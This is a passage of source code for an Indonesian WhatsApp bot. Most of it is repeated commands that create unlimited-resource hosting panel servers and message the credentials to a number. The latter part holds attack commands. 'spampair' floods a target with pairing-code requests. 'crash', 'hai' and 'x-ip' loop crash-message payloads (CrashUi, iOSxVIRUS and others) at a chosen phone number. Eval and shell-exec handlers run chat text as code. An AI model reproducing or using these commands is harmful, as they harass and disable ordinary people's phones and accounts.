 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '2gb-3': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "2024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '3gb-3': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "3024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '4gb-3': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "4024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : killuaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '5gb-3': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "5024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : KilluaDev*`;

 await killuaXs.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

//------------BATAS-----------//
case 'spampair': {
const usePairingCode = true
const NodeCache = require("node-cache")
const resolveMsgBuffer = new NodeCache()
			if (!isOwner) return
			if (!q) return reply(`*Syntax Error!*\n\n_Use : spampair 243xx`)
			let [peenis, pepekk = "1000"] = q.split("|")
			await reply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
			//await reaction(m.chat, "✅")
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@whiskeysockets/baileys')
			let {
				state
			} = await useMultiFileAuthState('pairSess')
			let {
				version
			} = await fetchLatestBaileysVersion()
			let sucked = await makeWaSocket({
				auth: state,
				logger: pino({ level: "silent" }),
					level: 'fatal'
				})
			for (let i = 0; i < pepekk; i++) {
			await sleep(1000)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(2000)
		}
		break

case "tourl": {
if (!isPremium) return reply(mess.only.premium)
if (!mime) return reply(`Kirim/Reply Media yang ingin dijadikan url dengan caption ${prefix+command}\n`)
let media = await quoted.download()
let encmedia = await uploadPomf2(media)
reply(` \`𝙎𝙪𝙘↯𝙘𝙚𝙨\`
> Name:* ${encmedia.files[0].name}
> *Url:* ${encmedia.files[0].url}
> *Size:* ${encmedia.files[0].size}
jangan lupa folow yt Dhika-Dev`)
//await fs.unlinkSync(media)
}

break

case 'crash':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 250; i++) {
await tamaLoca(target)
await CrashUi(target, null, xbug, cct = true, ptcp = true)
await sleep(1000)
await sleep(1000)
await sendLoc(target, null)
await sleep(1000)
await ZnX(target, "h4l0 Bn4h", 1020000, Ptcp = true)
await ngeloc(target, null)
await sleep(1000)
await invisIos(target, Ptcp = true)
await sleep(1000)
await tamaLoca(target)
await sleep(1000)
await StukLoc(target, null, xbug, Ptcp = true)
await sleep(1000)
await ZnX(target, "h4l0 Bn4h", 1020000, Ptcp = true)
await CallCrash(target, ptcp = true)
await sleep(1000)
await TxOs(target, Ptcp = true)
await sleep(1000)
await sendExtendedTextMessage(target)
await ZnX(target, "h4l0 Bn4h", 1020000, Ptcp = true)
await StuckSql(target, xbug, Ptcp = true)
await sleep(1000)
await newvirpen(target)
await sleep(1000)
await VIRDOK(target, null)
await sleep(1000)
await ZnX(target, "h4l0 Bn4h", 1020000, Ptcp = true)
}
break

case 'hai':
if (!isPremium) return reply(mess.only.premium)
target = m.chat
//reply(bugres)
for (let i = 0; i < 25; i++) {
await tamaLoca(target)
await tamaLoca(target)
await tamaLoca(target)
await tamaLoca(target)
await tamaLoca(target)
await tamaLoca(target)
await tamaLoca(target)
await tamaLoca(target)
await tamaLoca(target)
await tamaLoca(target)
await tamaLoca(target)
await tamaLoca(target)
await ZnX(target, "h4l0 Bn4h", 1020000, Ptcp = true)
}
break

case 'rvo': {
//if (!isCmd) return;
if (!quoted) return reply(`Reply Pesan Video atau Foto sekali lihat`);
if (m.quoted.mtype !== "viewOnceMessageV2") 
return reply(`This is not a view once message`);
                    
let msg = m.quoted.message;
let type = Object.keys(msg)[0];
let media = await downloadContentFromMessage(
msg[type],
type == "imageMessage" ? "image" : "video"
);
                    
let buffer = Buffer.from([]);
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk]);
}
                  
const options = {
caption: msg[type].caption || "",
mimetype: /video/.test(type) ? 'video/mp4' : 'image/jpeg',
                    };
                  
dhikaXs.sendMessage(m.chat, { 
[type === 'videoMessage' ? 'video' : 'image']: buffer, ...options 
}, { quoted: fpay }
);
}
break

case "addacces":{
if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await dhikaXs.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukin nomor yang bener tolol`)
prem.push(prrkek)
fs.writeFileSync(`./database/dtbs/premium.json`, JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi daftar addacces!`)
}
break
 
case "delacces":{
if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 243×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus delacces!`)
}
break

case 'public': {
if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
dhikaXs.public = true
reply('bot succes public note : fitur public hanya bisa di gunakan dengan owner')
}
break

case 'self': {
if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
dhikaXs.public = true
reply('bot succes self note : fitur self hanya bisa di gunakan dengan owner')
}
break

case 'x-ip': {		
 function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
   }
   if (!isPremium) return reply(mess.only.premium);
   if (!q) return reply(`Example: ${prefix + command} 62×××`);
   TargetPaks = text.split("|")[0].replace(/[^0-9]/g, '')
   if (TargetPaks.startsWith('0')) return reply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`)
   let target = TargetPaks + '@s.whatsapp.net';
   await loadingbug()
   reply(`\`[ # ]\` *_X-Attacking . . ._*`)
   await dhikaXs.sendMessage(m.chat, { react: { text: `⚠`, key: m.key }})
    global.jumlah = text.split("|")[1]
	  for (let i = 0; i < 200; i++) {
		await iOSxPAY(target)
	    await iOSxVIRUS(target)
		await sleep(500) // sleep jeda
		await iOSxPAY(target)
		await iOSxVIRUS(target)
		await sleep(500)
      }
   }
break
default:
}
if (budy.startsWith('=>')) {
if (!isOwner) return reply(` \`cuma bisa di akses oleh owner / premium\` `)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('$')) {
if (!isOwner) return reply(` \`cuma bisa di akses oleh owner / premium\` `)
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(` \`cuma bisa di akses oleh owner / premium\` `)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
dhikaXs.sendMessage(`${owner}@s.whatsapp.net`, {text:`Ang Ang Ang eror nih dhika : \n\n${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
